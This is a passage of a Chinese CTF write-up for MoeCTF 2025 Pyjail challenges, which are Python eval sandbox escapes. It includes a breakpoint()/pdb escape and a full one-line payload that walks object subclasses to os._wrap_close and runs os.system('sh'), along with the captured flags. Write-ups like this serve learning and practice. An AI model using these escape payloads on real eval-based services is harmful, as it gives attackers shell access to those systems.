+<p>比起上一题 多ban了  <br><code>.</code> <code>_</code> <code>[</code> <code>]</code> <code>'</code> <code>"</code>  <br>这下不能拼接了</p>
+<p>现查 查见能用 <code>breakpoint()</code></p>
+<p>会进入 pdb  <br>在 pdb 里可以输入 <code>import os; os.system('sh')</code> 之类的  <br>这些输入不再受 eval 和过滤的限制  <br>pdb 里以 <code>!</code> 开头的命令会被当作 Python 表达式</p>
+<p><img src="content/所有文章/解题记录/MoeCTF/moectf2025/图片/5m=17m2.png" alt="" referrerpolicy="no-referrer"></p>
+<p>这里又犯蠢了嗯对 第一下忘记加类了 不过还是拿到了  <br>复制 取得flag flag为  <br><code>moectf{0ee52ff3-95f1-9144-7121-5057fd4e025c}</code></p>
+<p><img src="content/所有文章/解题记录/MoeCTF/moectf2025/图片/5m=17m3.png" alt="" referrerpolicy="no-referrer"></p>
+<h2><strong>Pyjail 3</strong></h2>
+<p><strong>题目描述</strong>flag 位置在 /tmp 下  <br>其他信息见 Pyjail 0  <br><strong>工具</strong>：Python WebSocket</p>
+<p>拿附件 看源码</p>
+<pre><code>def chall():
+    user_input = input(&quot;Give me your code: &quot;)
+
+    try:
+        result = eval(user_input, {&quot;__builtins__&quot;: None}, {})
+        # Hint: When __builtins__ is None, you need to be more creative...
+        print(&quot;Code executed successfully!&quot;)
+        if result is not None:
+            print(f&quot;Return value: {result}&quot;)
+    except Exception as e:
+        print(f&quot;Execution error: {type(e).__name__}: {e}&quot;)
+</code></pre>
+<p>有 Hint</p>
+<pre><code># Hint: When __builtins__ is None, you need to be more creative...</code></pre>
+<p>总之就是把 <code>__builtins__</code> 给整个置空了  <br>Hint让找找其他能用的</p>
+<p>艾所以说Pyjail就是misc版的SSTI  <br>去到 <code>__object__</code> 先</p>
+<p><code>().__class__.__base__[0].__subclasses__()</code></p>
+<p>返回 <code>()</code> 的类的最"根"最"父亲"的类 即 <code>__object__</code>  <br>然后 <code>__subclasses__()</code> 列出所有类</p>
+<p><img src="content/所有文章/解题记录/MoeCTF/moectf2025/图片/5m=18m1.png" alt="" referrerpolicy="no-referrer"></p>
+<pre><code>[&lt;class &#x27;type&#x27;&gt;,
+&lt;class &#x27;async_generator&#x27;&gt;,
+&lt;class &#x27;bytearray_iterator&#x27;&gt;,
+&lt;class &#x27;bytearray&#x27;&gt;,
+&lt;class &#x27;bytes_iterator&#x27;&gt;,
+&lt;class &#x27;bytes&#x27;&gt;,
+&lt;class &#x27;builtin_function_or_method&#x27;&gt;,
+&lt;class &#x27;callable_iterator&#x27;&gt;,
+&lt;class &#x27;PyCapsule&#x27;&gt;,
+&lt;class &#x27;cell&#x27;&gt;,
+&lt;class &#x27;classmethod_descriptor&#x27;&gt;,
+&lt;class &#x27;classmethod&#x27;&gt;,
+&lt;class &#x27;code&#x27;&gt;,
+&lt;class &#x27;complex&#x27;&gt;,
+&lt;class &#x27;_contextvars.Token&#x27;&gt;,
+&lt;class &#x27;_contextvars.ContextVar&#x27;&gt;,
+&lt;class &#x27;_contextvars.Context&#x27;&gt;,
+&lt;class &#x27;coroutine&#x27;&gt;,
+&lt;class &#x27;dict_items&#x27;&gt;,
+&lt;class &#x27;dict_itemiterator&#x27;&gt;,
+&lt;class &#x27;dict_keyiterator&#x27;&gt;,
+&lt;class &#x27;dict_valueiterator&#x27;&gt;,
+&lt;class &#x27;dict_keys&#x27;&gt;,
+&lt;class &#x27;mappingproxy&#x27;&gt;,
+&lt;class &#x27;dict_reverseitemiterator&#x27;&gt;,
+&lt;class &#x27;dict_reversekeyiterator&#x27;&gt;,
+&lt;class &#x27;dict_reversevalueiterator&#x27;&gt;,
+&lt;class &#x27;dict_values&#x27;&gt;,
+&lt;class &#x27;dict&#x27;&gt;,
+&lt;class &#x27;ellipsis&#x27;&gt;,
+&lt;class &#x27;enumerate&#x27;&gt;,
+&lt;class &#x27;filter&#x27;&gt;,
+&lt;class &#x27;float&#x27;&gt;,
+&lt;class &#x27;frame&#x27;&gt;,
+&lt;class &#x27;frozenset&#x27;&gt;,
+&lt;class &#x27;function&#x27;&gt;,
+&lt;class &#x27;generator&#x27;&gt;,
+&lt;class &#x27;getset_descriptor&#x27;&gt;,
+&lt;class &#x27;instancemethod&#x27;&gt;,
+&lt;class &#x27;list_iterator&#x27;&gt;,
+&lt;class &#x27;list_reverseiterator&#x27;&gt;,
+&lt;class &#x27;list&#x27;&gt;,
+&lt;class &#x27;longrange_iterator&#x27;&gt;,
+&lt;class &#x27;int&#x27;&gt;,
+&lt;class &#x27;map&#x27;&gt;,
+&lt;class &#x27;member_descriptor&#x27;&gt;,
+&lt;class &#x27;memoryview&#x27;&gt;,
+&lt;class &#x27;method_descriptor&#x27;&gt;,
+&lt;class &#x27;method&#x27;&gt;,
+&lt;class &#x27;moduledef&#x27;&gt;,
+&lt;class &#x27;module&#x27;&gt;,
+&lt;class &#x27;odict_iterator&#x27;&gt;,
+&lt;class &#x27;pickle.PickleBuffer&#x27;&gt;,
+&lt;class &#x27;property&#x27;&gt;,
+&lt;class &#x27;range_iterator&#x27;&gt;,
+&lt;class &#x27;range&#x27;&gt;,
+&lt;class &#x27;reversed&#x27;&gt;,
+&lt;class &#x27;symtable entry&#x27;&gt;,
+&lt;class &#x27;iterator&#x27;&gt;,
+&lt;class &#x27;set_iterator&#x27;&gt;,
+&lt;class &#x27;set&#x27;&gt;,
+&lt;class &#x27;slice&#x27;&gt;,
+&lt;class &#x27;staticmethod&#x27;&gt;,
+&lt;class &#x27;stderrprinter&#x27;&gt;,
+&lt;class &#x27;super&#x27;&gt;,
+&lt;class &#x27;traceback&#x27;&gt;,
+&lt;class &#x27;tuple_iterator&#x27;&gt;,
+&lt;class &#x27;tuple&#x27;&gt;,
+&lt;class &#x27;str_iterator&#x27;&gt;,
+&lt;class &#x27;str&#x27;&gt;,
+&lt;class &#x27;wrapper_descriptor&#x27;&gt;,
+&lt;class &#x27;zip&#x27;&gt;,
+&lt;class &#x27;types.GenericAlias&#x27;&gt;,
+&lt;class &#x27;anext_awaitable&#x27;&gt;,
+&lt;class &#x27;async_generator_asend&#x27;&gt;,
+&lt;class &#x27;async_generator_athrow&#x27;&gt;,
+&lt;class &#x27;async_generator_wrapped_value&#x27;&gt;,
+&lt;class &#x27;_buffer_wrapper&#x27;&gt;,
+&lt;class &#x27;Token.MISSING&#x27;&gt;,
+&lt;class &#x27;coroutine_wrapper&#x27;&gt;,
+&lt;class &#x27;generic_alias_iterator&#x27;&gt;,
+&lt;class &#x27;items&#x27;&gt;, &lt;class &#x27;keys&#x27;&gt;,
+&lt;class &#x27;values&#x27;&gt;,
+&lt;class &#x27;hamt_array_node&#x27;&gt;,
+&lt;class &#x27;hamt_bitmap_node&#x27;&gt;,
+&lt;class &#x27;hamt_collision_node&#x27;&gt;,
+&lt;class &#x27;hamt&#x27;&gt;,
+&lt;class &#x27;sys.legacy_event_handler&#x27;&gt;,
+&lt;class &#x27;InterpreterID&#x27;&gt;,
+&lt;class &#x27;line_iterator&#x27;&gt;,
+&lt;class &#x27;managedbuffer&#x27;&gt;,
+&lt;class &#x27;memory_iterator&#x27;&gt;,
+&lt;class &#x27;method-wrapper&#x27;&gt;,
+&lt;class &#x27;types.SimpleNamespace&#x27;&gt;,
+&lt;class &#x27;NoneType&#x27;&gt;,
+&lt;class &#x27;NotImplementedType&#x27;&gt;,
+&lt;class &#x27;positions_iterator&#x27;&gt;,
+&lt;class &#x27;str_ascii_iterator&#x27;&gt;,
+&lt;class &#x27;types.UnionType&#x27;&gt;,
+&lt;class &#x27;weakref.CallableProxyType&#x27;&gt;,
+&lt;class &#x27;weakref.ProxyType&#x27;&gt;,
+&lt;class &#x27;weakref.ReferenceType&#x27;&gt;,
+&lt;class &#x27;typing.TypeAliasType&#x27;&gt;,
+&lt;class &#x27;typing.Generic&#x27;&gt;,
+&lt;class &#x27;typing.TypeVar&#x27;&gt;,
+&lt;class &#x27;typing.TypeVarTuple&#x27;&gt;,
+&lt;class &#x27;typing.ParamSpec&#x27;&gt;,
+&lt;class &#x27;typing.ParamSpecArgs&#x27;&gt;,
+&lt;class &#x27;typing.ParamSpecKwargs&#x27;&gt;,
+&lt;class &#x27;EncodingMap&#x27;&gt;,
+&lt;class &#x27;fieldnameiterator&#x27;&gt;,
+&lt;class &#x27;formatteriterator&#x27;&gt;,
+&lt;class &#x27;BaseException&#x27;&gt;,
+&lt;class &#x27;_frozen_importlib._WeakValueDictionary&#x27;&gt;,
+&lt;class &#x27;_frozen_importlib._BlockingOnManager&#x27;&gt;,
+&lt;class &#x27;_frozen_importlib._ModuleLock&#x27;&gt;,
+&lt;class &#x27;_frozen_importlib._DummyModuleLock&#x27;&gt;,
+&lt;class &#x27;_frozen_importlib._ModuleLockManager&#x27;&gt;,
+&lt;class &#x27;_frozen_importlib.ModuleSpec&#x27;&gt;,
+&lt;class &#x27;_frozen_importlib.BuiltinImporter&#x27;&gt;,
+&lt;class &#x27;_frozen_importlib.FrozenImporter&#x27;&gt;,
+&lt;class &#x27;_frozen_importlib._ImportLockContext&#x27;&gt;,
+&lt;class &#x27;_thread.lock&#x27;&gt;,
+&lt;class &#x27;_thread.RLock&#x27;&gt;,
+&lt;class &#x27;_thread._localdummy&#x27;&gt;,
+&lt;class &#x27;_thread._local&#x27;&gt;,
+&lt;class &#x27;_io.IncrementalNewlineDecoder&#x27;&gt;,
+&lt;class &#x27;_io._BytesIOBuffer&#x27;&gt;,
+&lt;class &#x27;_io._IOBase&#x27;&gt;,
+&lt;class &#x27;posix.ScandirIterator&#x27;&gt;,
+&lt;class &#x27;posix.DirEntry&#x27;&gt;,
+&lt;class &#x27;_frozen_importlib_external.WindowsRegistryFinder&#x27;&gt;,
+&lt;class &#x27;_frozen_importlib_external._LoaderBasics&#x27;&gt;,
+ &lt;class &#x27;_frozen_importlib_external.FileLoader&#x27;&gt;,
+&lt;class &#x27;_frozen_importlib_external._NamespacePath&#x27;&gt;,
+&lt;class &#x27;_frozen_importlib_external.NamespaceLoader&#x27;&gt;,
+&lt;class &#x27;_frozen_importlib_external.PathFinder&#x27;&gt;,
+&lt;class &#x27;_frozen_importlib_external.FileFinder&#x27;&gt;,
+&lt;class &#x27;codecs.Codec&#x27;&gt;,
+&lt;class &#x27;codecs.IncrementalEncoder&#x27;&gt;,
+&lt;class &#x27;codecs.IncrementalDecoder&#x27;&gt;,
+&lt;class &#x27;codecs.StreamReaderWriter&#x27;&gt;,
+&lt;class &#x27;codecs.StreamRecoder&#x27;&gt;,
+&lt;class &#x27;_abc._abc_data&#x27;&gt;,
+&lt;class &#x27;abc.ABC&#x27;&gt;,
+&lt;class &#x27;collections.abc.Hashable&#x27;&gt;,
+&lt;class &#x27;collections.abc.Awaitable&#x27;&gt;,
+&lt;class &#x27;collections.abc.AsyncIterable&#x27;&gt;,
+&lt;class &#x27;collections.abc.Iterable&#x27;&gt;,
+&lt;class &#x27;collections.abc.Sized&#x27;&gt;,
+&lt;class &#x27;collections.abc.Container&#x27;&gt;,
+&lt;class &#x27;collections.abc.Buffer&#x27;&gt;,
+&lt;class &#x27;collections.abc.Callable&#x27;&gt;,
+&lt;class &#x27;genericpath.ALLOW_MISSING&#x27;&gt;,
+&lt;class &#x27;os._wrap_close&#x27;&gt;,
+&lt;class &#x27;_sitebuiltins.Quitter&#x27;&gt;,
+&lt;class &#x27;_sitebuiltins._Printer&#x27;&gt;,
+&lt;class &#x27;_sitebuiltins._Helper&#x27;&gt;,
+&lt;class &#x27;ast.AST&#x27;&gt;,
+&lt;class &#x27;warnings.WarningMessage&#x27;&gt;,
+&lt;class &#x27;warnings.catch_warnings&#x27;&gt;,
+&lt;class &#x27;operator.attrgetter&#x27;&gt;,
+&lt;class &#x27;operator.itemgetter&#x27;&gt;,
+&lt;class &#x27;operator.methodcaller&#x27;&gt;,
+&lt;class &#x27;itertools.accumulate&#x27;&gt;,
+&lt;class &#x27;itertools.batched&#x27;&gt;,
+&lt;class &#x27;itertools.chain&#x27;&gt;,
+&lt;class &#x27;itertools.combinations&#x27;&gt;,
+&lt;class &#x27;itertools.compress&#x27;&gt;,
+&lt;class &#x27;itertools.count&#x27;&gt;,
+&lt;class &#x27;itertools.combinations_with_replacement&#x27;&gt;,
+&lt;class &#x27;itertools.cycle&#x27;&gt;,
+&lt;class &#x27;itertools.dropwhile&#x27;&gt;,
+&lt;class &#x27;itertools.filterfalse&#x27;&gt;,
+&lt;class &#x27;itertools.groupby&#x27;&gt;,
+&lt;class &#x27;itertools._grouper&#x27;&gt;,
+&lt;class &#x27;itertools.islice&#x27;&gt;,
+&lt;class &#x27;itertools.pairwise&#x27;&gt;,
+&lt;class &#x27;itertools.permutations&#x27;&gt;,
+&lt;class &#x27;itertools.product&#x27;&gt;,
+&lt;class &#x27;itertools.repeat&#x27;&gt;,
+&lt;class &#x27;itertools.starmap&#x27;&gt;,
+&lt;class &#x27;itertools.takewhile&#x27;&gt;,
+&lt;class &#x27;itertools._tee&#x27;&gt;,
+&lt;class &#x27;itertools._tee_dataobject&#x27;&gt;,
+&lt;class &#x27;itertools.zip_longest&#x27;&gt;,
+&lt;class &#x27;_random.Random&#x27;&gt;,
+&lt;class &#x27;_sha2.SHA224Type&#x27;&gt;,
+&lt;class &#x27;_sha2.SHA256Type&#x27;&gt;,
+&lt;class &#x27;_sha2.SHA384Type&#x27;&gt;,
+&lt;class &#x27;_sha2.SHA512Type&#x27;&gt;,
+&lt;class &#x27;types.DynamicClassAttribute&#x27;&gt;,
+&lt;class &#x27;types._GeneratorWrapper&#x27;&gt;,
+&lt;class &#x27;reprlib.Repr&#x27;&gt;,
+&lt;class &#x27;collections.deque&#x27;&gt;,
+&lt;class &#x27;collections._deque_iterator&#x27;&gt;,
+&lt;class &#x27;collections._deque_reverse_iterator&#x27;&gt;,
+&lt;class &#x27;collections._tuplegetter&#x27;&gt;,
+&lt;class &#x27;collections._Link&#x27;&gt;,
+&lt;class &#x27;functools.partial&#x27;&gt;,
+&lt;class &#x27;functools._lru_cache_wrapper&#x27;&gt;,
+&lt;class &#x27;functools.KeyWrapper&#x27;&gt;,
+&lt;class &#x27;functools._lru_list_elem&#x27;&gt;,
+&lt;class &#x27;functools.partialmethod&#x27;&gt;,
+&lt;class &#x27;functools.singledispatchmethod&#x27;&gt;,
+&lt;class &#x27;functools.cached_property&#x27;&gt;,
+&lt;class &#x27;enum.nonmember&#x27;&gt;,
+&lt;class &#x27;enum.member&#x27;&gt;,
+&lt;class &#x27;enum._not_given&#x27;&gt;,
+&lt;class &#x27;enum._auto_null&#x27;&gt;,
+&lt;class &#x27;enum.auto&#x27;&gt;,
+&lt;class &#x27;enum._proto_member&#x27;&gt;,
+&lt;enum &#x27;Enum&#x27;&gt;, &lt;class &#x27;enum.verify&#x27;&gt;,
+&lt;class &#x27;re.Pattern&#x27;&gt;,
+&lt;class &#x27;re.Match&#x27;&gt;,
+&lt;class &#x27;_sre.SRE_Scanner&#x27;&gt;,
+&lt;class &#x27;_sre.SRE_Template&#x27;&gt;,
+&lt;class &#x27;re._parser.State&#x27;&gt;,
+&lt;class &#x27;re._parser.SubPattern&#x27;&gt;,
+&lt;class &#x27;re._parser.Tokenizer&#x27;&gt;,
+&lt;class &#x27;re.Scanner&#x27;&gt;,
+&lt;class &#x27;string.Template&#x27;&gt;,
+&lt;class &#x27;string.Formatter&#x27;&gt;]</code></pre>
+<p>瞅瞎我的眼吧再 扔给ai看看</p>
+<p><img src="content/所有文章/解题记录/MoeCTF/moectf2025/图片/5m=18m2.png" alt="" referrerpolicy="no-referrer"></p>
+<p>嗯ai依旧不会数数说是 不过找到类就行了 大不了我自己数.....</p>
+<p>这里用 <code>os._wrap_close</code></p>
+<p><img src="content/所有文章/解题记录/MoeCTF/moectf2025/图片/5m=18m3.png" alt="" referrerpolicy="no-referrer"></p>
+<p>记事本显示的行数是155</p>
+<p><code>().__class__.__bases__[0].__subclasses__()[155].__init__.__globals__['__builtins__']['__import__']('os').system('sh')</code></p>
+<p><img src="content/所有文章/解题记录/MoeCTF/moectf2025/图片/5m=18m5.png" alt="" referrerpolicy="no-referrer"></p>
+<p>复制 取得flag flag为  <br><code>moectf{9d48e9c3-3880-0bd9-63d6-8eaa9646a139}</code></p>
+<p><img src="content/所有文章/解题记录/MoeCTF/moectf2025/图片/5m=18m6.png" alt="" referrerpolicy="no-referrer"></p>
